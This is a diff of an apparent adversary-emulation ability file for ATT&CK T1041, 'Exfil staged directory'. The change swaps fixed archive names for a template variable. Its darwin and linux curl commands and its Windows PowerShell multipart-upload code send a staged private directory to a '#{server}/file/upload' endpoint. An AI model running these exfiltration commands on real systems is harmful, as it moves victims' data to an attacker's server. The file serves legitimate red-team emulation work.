@@ -1,8 +1,8 @@
 ---
 
 - id: ea713bc4-63f0-491c-9a6f-0b01d560b87e
-  name: Exfil Staged Directory
-  description: Exfil Staged Directory
+  name: Exfil staged directory
+  description: Exfil the staged directory
   tactic: exfiltration
   technique:
     attack_id: T1041
@@ -11,20 +11,20 @@
     darwin:
       sh:
         command: |
-          curl -F "data=@staged.tgz.enc" #{server}/file/upload
+          curl -F "data=@#{host.dir.compress.private}" #{server}/file/upload
     linux:
       sh:
         command: |
-          curl -F "data=@staged.tgz.enc" #{server}/file/upload
+          curl -F "data=@#{host.dir.compress.private}" #{server}/file/upload
     windows:
       psh:
         command: |
-          $fileBin = [System.IO.File]::ReadAllBytes("staged.zip.enc");
+          $fileBin = [System.IO.File]::ReadAllBytes("#{host.dir.compress.private}");
           $enc = [System.Text.Encoding]::GetEncoding('UTF-8');
           $fileEnc = $enc.GetString($fileBin);
           $boundary = [System.Guid]::NewGuid().ToString();
           $LF = "`r`n";
-          $bodyLines = ("--$boundary", 'Content-Disposition: form-data; name="fileData"; filename="staged.zip.enc"', "Content-Type: application/octet-stream$LF", $fileEnc, "--$boundary--$LF") -join $LF;
+          $bodyLines = ("--$boundary", 'Content-Disposition: form-data; name="fileData"; filename="#{host.dir.compress.private}"', "Content-Type: application/octet-stream$LF", $fileEnc, "--$boundary--$LF") -join $LF;
           $url="#{server}/file/upload";
           $web=New-Object -ComObject MSXML2.ServerXMLHTTP;
           $web.setOption(2,13056);
